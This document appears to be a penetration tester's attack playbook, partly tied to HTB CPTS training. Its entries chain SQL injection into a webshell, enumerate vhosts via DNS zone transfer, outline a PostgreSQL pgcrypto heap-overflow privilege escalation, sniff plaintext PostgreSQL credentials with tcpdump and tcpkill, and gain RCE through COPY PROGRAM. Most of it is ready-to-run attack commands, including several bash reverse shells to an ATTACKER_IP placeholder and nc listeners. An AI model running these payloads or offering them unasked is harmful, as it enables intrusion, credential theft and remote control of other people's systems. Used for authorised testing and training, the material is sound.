# Web – SQL Injection to RCE

### Boolean SQLi to Extract File Path → Direct RCE (HTB CPTS) [added: 2026-04]
- **Tags:** #SQLi #BooleanSQLi #sqlmap #MySQL #RCE #FileUpload #WebShell #PHP
- **Trigger:** SQLi confirmed on web app with file download/upload functionality and MySQL backend
- **Prereq:** Confirmed SQL injection (boolean-based) + MySQL backend + file upload or known writable web directory
- **Yields:** Remote code execution via webshell after extracting real file paths from the database
- **Opsec:** Med
- **Context:** File download endpoint with Boolean-based SQLi in UUID parameter. DB stores real file path. Upload PHP webshell, get path via SQLi, execute it.
- **Payload/Method:**
```bash
# Step 1: Confirm Boolean SQLi
curl "http://target/download.php?file=UUID'+AND+1=1--+-"   # → normal
curl "http://target/download.php?file=UUID'+AND+1=0--+-"   # → "File does not exist"

# Step 2: Use sqlmap to dump real file paths from DB
sqlmap -u 'http://target/download.php?file=<UUID>' --dbms mysql -p file --technique='B' \
  -D securetransfer --dump --threads 10 --batch
# Gets: real_path = /var/www/html/storage/2_UUID.php

# Step 3: Upload PHP reverse shell, then access it via real path
curl http://target/storage/2_UUID.php   # triggers reverse shell
# Listener: nc -lnvp 4444
```

### DNS Zone Transfer → Vhost Discovery → Web Attack Chain (HTB CPTS) [added: 2026-04]
- **Tags:** #DNS #ZoneTransfer #AXFR #VhostEnum #ffuf #Recon #SubdomainDiscovery #dig
- **Trigger:** DNS server (port 53) exposed on target and responds to zone transfer requests
- **Prereq:** DNS server accessible + zone transfer (AXFR) allowed for the target domain
- **Yields:** Discovery of internal virtual hosts and subdomains, expanding the web attack surface
- **Opsec:** Low
- **Context:** DNS server exposed. Zone transfer reveals internal vhosts. Each vhost may have a different attack surface.
- **Payload/Method:**
```bash
# DNS zone transfer
dig axfr target.local @<TARGET_IP>

# Add discovered vhosts to /etc/hosts
echo "<IP> target.local dev.target.local blog.target.local admin.target.local" >> /etc/hosts

# Enumerate each vhost for hidden paths
ffuf -w /usr/share/wordlists/dirb/small.txt -u http://dev.target.local/FUZZ
```

### PostgreSQL pgcrypto Heap Overflow → RCE (CVE-2026-2005) [added: 2026-05]
- **Tags:** #PostgreSQL #pgcrypto #HeapOverflow #RCE #CVE-2026-2005 #BufferOverflow #CopyToProgram #DBExploit
- **Trigger:** PostgreSQL instance reachable with authenticated SQL access + CREATE privilege; pgcrypto available or installable; version ≤ 17.7 / 16.11 / 15.15 / 14.20 / 18.1
- **Prereq:** Auth SQL access (no superuser needed); CREATE privilege on database
- **Yields:** OS command execution as postgres OS user via `COPY TO PROGRAM` after escalating to superuser by overwriting `CurrentUserId`
- **Opsec:** Med
- **Context:** DB creds obtained (app config, SQLi dump, credential reuse). Load pgcrypto, overflow `pgp_pub_decrypt_bytea` to leak PIE base + heap addresses, then craft second payload targeting `CurrentUserId` in `.data` section → set to `10` (BOOTSTRAP_SUPERUSERID) → OS RCE.
- **Payload/Method:**
```sql
-- Step 1: Load extension (CREATE priv only, no superuser needed)
CREATE EXTENSION IF NOT EXISTS pgcrypto;

-- Step 2: Stage 1 — Info leak via overflow of pgp_parse_pubenc_sesskey()
-- Craft RSA/ElGamal payload where (msglen - 3) > 32 (PGP_MAX_KEY) to overflow dst buffer
-- Returned memory exposes PIE base and heap addresses
SELECT pgp_pub_decrypt_bytea('<crafted_overflow_bytea>'::bytea, '<private_key>'::bytea);

-- Step 3: Stage 2 — Arbitrary write; corrupt all four dst struct fields
-- Target CurrentUserId address = PIE base + known offset; write value 10
SELECT pgp_pub_decrypt_bytea('<crafted_write_payload>'::bytea, '<private_key>'::bytea);

-- Step 4: Stage 3 — RCE as superuser
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1';
```
- **Note:** ASLR layout is identical across all connections to the same postmaster — leak addresses on one connection, exploit on the next. PoC: https://www.zeroday.cloud/blog/postgres-xint

### PostgreSQL Plaintext Credential Interception via tcpdump + tcpkill [added: 2026-05]
- **Tags:** #PostgreSQL #CredentialSniffing #Tcpdump #Tcpkill #Pcap #NetworkSniff #ContainerLateral #PlaintextAuth
- **Trigger:** Network access to PostgreSQL port 5432 + `tcpdump`/`tcpkill` available (via cap_net_raw, SUID, or root) + PostgreSQL connection uses md5/password auth (not TLS)
- **Prereq:** Shell on a host or container that can see port 5432 traffic + `tcpdump` and `tcpkill` available + PostgreSQL not using TLS (`sslmode=disable` or server doesn't enforce SSL)
- **Yields:** Plaintext PostgreSQL username, password, and database name captured from the re-established connection handshake
- **Opsec:** Med
- **Context:** PostgreSQL by default transmits credentials during connection handshake in plaintext when SSL is not enforced. Inside a container environment, `tcpdump` (with cap_net_raw) + `tcpkill` can intercept reconnecting app credentials by killing the existing connection and capturing the re-establishment. The application reconnects automatically, replaying the credential handshake in plaintext.
- **Payload/Method:**
  ```bash
  # Step 1 — Start packet capture on postgres traffic
  tcpdump -i eth0 -s 0 -w /tmp/pg_capture.pcap 'tcp port 5432' &

  # Step 2 — Kill existing connection to force reconnection (app will auto-reconnect)
  # tcpkill terminates the TCP session — the app reconnects, replaying credentials
  tcpkill -i eth0 host postgres_db and port 5432

  # Wait a few seconds for reconnect, then stop capture
  sleep 5 && kill %1

  # Step 3 — Analyze pcap for credentials
  # Look for StartupMessage packets containing user/database/password fields
  tcpdump -nnvvXSs 0 -r /tmp/pg_capture.pcap | grep -A5 -i "user\|password\|database"

  # Alternative: use strings to extract printable text
  strings /tmp/pg_capture.pcap | grep -i "user\|password\|database\|mydatabase"

  # Alternative: Wireshark/tshark for cleaner parsing
  tshark -r /tmp/pg_capture.pcap -Y "pgsql" -T fields -e pgsql.parameter_value 2>/dev/null

  # Verify SSL status of server (if SSL not enforced, traffic is plaintext)
  psql -h postgres_db -c "SHOW ssl;"
  ```

### PostgreSQL COPY FROM PROGRAM RCE (Superuser / pg_execute_server_program) [added: 2026-05]
- **Tags:** #PostgreSQL #COPY #RCE #Superuser #CopyFromProgram #Shell #DBPrivEsc #OsExec
- **Trigger:** PostgreSQL credentials obtained + user has superuser role OR `pg_execute_server_program` membership
- **Prereq:** `psql` access with superuser or `pg_execute_server_program` privilege; no pgcrypto exploit needed
- **Yields:** OS command execution as the `postgres` OS user; reverse shell
- **Opsec:** Med
- **Context:** When you have PostgreSQL credentials for a superuser account (or a role with `pg_execute_server_program`), `COPY FROM PROGRAM` executes arbitrary OS commands directly without any CVE or privilege escalation. Distinct from the pgcrypto exploit — this requires superuser but no specific version. Check `\du` for superuser flag.
- **Payload/Method:**
  ```sql
  -- Confirm superuser privilege
  SELECT current_user, pg_has_role(current_user, 'pg_execute_server_program', 'member');
  -- Or: \du in psql to see role attributes

  -- Method 1: COPY FROM PROGRAM (requires superuser or pg_execute_server_program)
  CREATE TABLE shell(t TEXT);
  COPY shell FROM PROGRAM '/bin/bash -c "/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/7000 0>&1"';

  -- Method 2: COPY TO PROGRAM (write direction, also works)
  COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1';

  -- Method 3: Write file via COPY then execute (alternative if network blocked)
  COPY (SELECT '#!/bin/bash\nbash -i >& /dev/tcp/<IP>/4444 0>&1') TO '/tmp/rs.sh';
  COPY shell FROM PROGRAM 'chmod +x /tmp/rs.sh && /tmp/rs.sh';
  ```
  ```bash
  # Listener side
  nc -lvnp 7000
  ```
